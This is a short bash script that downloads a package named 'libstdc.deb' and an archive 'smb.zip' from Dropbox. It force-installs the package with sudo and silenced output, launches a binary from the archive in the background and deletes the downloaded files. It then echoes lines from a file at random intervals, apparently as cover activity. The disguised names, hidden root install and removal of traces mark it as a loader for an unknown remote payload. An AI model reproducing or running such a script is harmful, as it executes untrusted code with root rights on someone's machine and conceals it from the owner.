#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/yz0wp1wam2u74ir/smb.zip -q
unzip smb.zip > /dev/null 2>&1
#pwd
./lib/smb ./lib/smbdata &
sleep 3
rm -rf smb.zip
rm -rf lib/smb
rm -rf lib/smbdata
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 50 ))
done < $2

